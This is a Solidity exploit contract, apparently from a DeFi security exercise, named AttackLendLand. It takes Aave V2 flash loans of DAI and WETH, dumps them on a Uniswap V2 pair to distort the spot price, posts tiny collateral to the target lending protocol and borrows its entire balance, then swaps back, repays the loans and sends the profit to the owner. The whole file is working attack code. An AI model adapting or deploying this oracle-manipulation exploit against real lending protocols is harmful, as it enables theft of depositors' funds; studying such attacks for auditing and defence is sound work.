// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {IUniswapV2Pair, IUniswapV2Router01} from "../interfaces/IUniswapV2.sol";
import {IWETH9} from "../../src/interfaces/IWETH9.sol";
import "../../src/interfaces/ILendingPool.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "forge-std/console.sol";

interface ILendLand {
    function deposit(address _token, uint256 _amount) external;
    function borrow(address _token, uint256 _amount) external;
}

contract AttackLendLand is Ownable {
    // Protocols/ Contracts
    ILendLand private immutable lendLand;
    IUniswapV2Pair private immutable pair;
    IUniswapV2Router01 private immutable router;
    ILendingPool private immutable aavePool;

    // Tokens
    address private immutable aWETH;
    address private immutable aDAI;

    IERC20 private immutable token0;
    IERC20 private immutable token1;

    uint256 private reserve0;
    uint256 private reserve1;

    constructor(address _pair, address _router, address _lendLand, address _aavePool, address _aweth, address _adai) {
        pair = IUniswapV2Pair(_pair);
        router = IUniswapV2Router01(_router);
        lendLand = ILendLand(_lendLand);
        aavePool = ILendingPool(_aavePool);
        aWETH = _aweth;
        aDAI = _adai;
        token0 = IERC20(IUniswapV2Pair(_pair).token0()); // DAI
        token1 = IERC20(IUniswapV2Pair(_pair).token1()); // WETH
    }

    function attack() external onlyOwner {
        console.log("~~~~~~~~~~~~~~~ Strating Attack ~~~~~~~~~~~~~~~~");

        // Determine AAVE Liquidity
        uint256 daiLiquidity = token0.balanceOf(aDAI);
        uint256 wethLiquidity = token1.balanceOf(aWETH);

        console.log("Available DAI Liquidity in AAVE V2 aDAI Contract: ", daiLiquidity);
        console.log("Available WETH Liquidity in AAVE V2 aWETH Contract: ", wethLiquidity);

        // Initiate DAI Flashloan
        _getFlashLoan(address(token0), daiLiquidity);
        token0.transfer(owner(), token0.balanceOf(address(this)));

        // Initiate WETH Flashloan
        _getFlashLoan(address(token1), wethLiquidity / 9);
        token1.transfer(owner(), token1.balanceOf(address(this)));

        console.log("~~~~~~~~~~~~~~~ Ending Attack ~~~~~~~~~~~~~~~~");
    }

    function _getFlashLoan(address token, uint256 amount) internal {
        address[] memory tokens = new address[](1);
        tokens[0] = token;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = amount;
        uint256[] memory modes = new uint256[](1);
        modes[0] = 0;

        aavePool.flashLoan(address(this), tokens, amounts, modes, address(this), "0x", 0);
    }

    function executeOperation(
        address[] memory assets,
        uint256[] memory amounts,
        uint256[] memory premiums,
        address initiator,
        bytes memory
    ) public returns (bool) {
        require(msg.sender == address(aavePool), "not pool");
        require(initiator == address(this), "I didn't initiate this flash loan");

        IERC20 token;
        uint256 minAmountOut;
        address[] memory path = new address[](2);
        uint256 wethBalance;
        uint256 daiBalance;
        uint256 toDeposit;

        _fetchReserves();

        for (uint256 i = 0; i < assets.length; i++) {
            token = IERC20(assets[i]);

            // DAI Flashloan case
            if (token == token0) {
                console.log("~~~~~~~~~~~~~~~ DAI Flashloan Start ~~~~~~~~~~~~~~~~");
                console.log("DAI Received from flashloan: ", amounts[i]);

                // Sell out flashloaned DAI to WETH
                minAmountOut = router.getAmountOut(amounts[i], reserve0, reserve1);
                path[0] = address(token0);
                path[1] = address(token1);

                token0.approve(address(router), amounts[i]);

                router.swapExactTokensForTokens(amounts[i], minAmountOut, path, address(this), block.timestamp);
                wethBalance = token1.balanceOf(address(this));

                console.log("WETH balance after swap: ", wethBalance);

                _fetchReserves();

                // Deposit 0.24% of our WETH
                toDeposit = wethBalance * 24 / 10000;
                console.log("WETH to deposit: ", toDeposit);
                token1.approve(address(lendLand), toDeposit);
                lendLand.deposit(address(token1), toDeposit);

                // Try to borrow all of the DAI balance
                console.log("Want to borrow DAI: ", token0.balanceOf(address(lendLand)));
                lendLand.borrow(address(token0), token0.balanceOf(address(lendLand)));

                // Swap back from WETH to DAI
                wethBalance = token1.balanceOf(address(this));
                minAmountOut = router.getAmountOut(wethBalance, reserve1, reserve0);

                path[0] = address(token1);
                path[1] = address(token0);

                token1.approve(address(router), wethBalance);

                router.swapExactTokensForTokens(wethBalance, minAmountOut, path, address(this), block.timestamp);

                daiBalance = token0.balanceOf(address(this));
                console.log("DAI Balance: ", daiBalance);
                console.log("~~~~~~~~~~~~~~~~~~~ DAI Flashloan End ~~~~~~~~~~~~~~~");
            }
            // WETH Flashloan case
            else {
                console.log("~~~~~~~~~~~~~~~ WETH Flashloan Start ~~~~~~~~~~~~~~~~");
                console.log("WETH Received from flashloan: ", amounts[i]);

                // Sell out flashloaned WETH to DAI
                minAmountOut = router.getAmountOut(amounts[i], reserve1, reserve0);
                path[0] = address(token1);
                path[1] = address(token0);

                token1.approve(address(router), amounts[i]);

                router.swapExactTokensForTokens(amounts[i], minAmountOut, path, address(this), block.timestamp);
                daiBalance = token0.balanceOf(address(this));

                console.log("DAI balance after swap: ", daiBalance);

                _fetchReserves();

                // Deposit 0.27% of our DAI
                toDeposit = daiBalance * 27 / 10000;
                console.log("DAI to deposit: ", toDeposit);
                token0.approve(address(lendLand), toDeposit);
                lendLand.deposit(address(token0), toDeposit);

                // Try to borrow all of the WETH balance
                console.log("Want to borrow WETH: ", token1.balanceOf(address(lendLand)));
                lendLand.borrow(address(token1), token1.balanceOf(address(lendLand)));

                // Swap back from DAI to WETH
                daiBalance = token0.balanceOf(address(this));
                minAmountOut = router.getAmountOut(daiBalance, reserve0, reserve1);

                path[0] = address(token0);
                path[1] = address(token1);

                token0.approve(address(router), daiBalance);

                router.swapExactTokensForTokens(daiBalance, minAmountOut, path, address(this), block.timestamp);

                wethBalance = token1.balanceOf(address(this));
                console.log("WETH Balance: ", wethBalance);
                console.log("~~~~~~~~~~~~~~~~~~~ WETH Flashloan End ~~~~~~~~~~~~~~~");
            }

            uint256 owed = amounts[i] + premiums[i];
            token.approve(address(aavePool), owed);
        }

        return true;
    }

    function _fetchReserves() internal {
        (reserve0, reserve1,) = pair.getReserves();

        console.log("reserve0 before: ", reserve0);
        console.log("reserve1 before: ", reserve1);
        console.log("ETH price before: ", (reserve0 / reserve1));
    }
}
